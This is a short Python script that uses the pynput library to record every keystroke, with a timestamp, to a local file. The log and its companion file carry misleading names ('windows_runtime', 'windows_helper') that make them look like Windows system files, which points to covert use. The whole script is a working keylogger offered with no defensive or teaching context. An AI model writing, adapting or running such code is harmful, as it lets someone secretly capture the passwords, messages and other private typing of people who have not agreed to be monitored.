import logging
import os
from pynput.keyboard import Listener

script_path = '\\'.join(__file__.split('\\')[0:-1])+'\\'
log_file_path = script_path + "windows_runtime"
last_line_file_path = script_path + "windows_helper"


if os.path.isfile(log_file_path):
    print (f"Log file exists at {log_file_path}")
else:
    print (f"Creating log file at {log_file_path}")
    open(log_file_path, 'a').close()

if os.path.isfile(last_line_file_path):
    print (f"Last line file exists at {last_line_file_path}")
else:
    print (f"Creating last line file at {last_line_file_path}")
    open(last_line_file_path, 'a').close()


logging.basicConfig(
                    filename=(log_file_path), 
                    level=logging.DEBUG,
                    style='{',
                    format='{created:.3f} {message}', 
                    datefmt=None
                    )

def on_press(key):
    key = str(key).replace("'", "")
    print(key)
    logging.info('{0}'.format(key))

with Listener(on_press=on_press) as listener:
    listener.join()
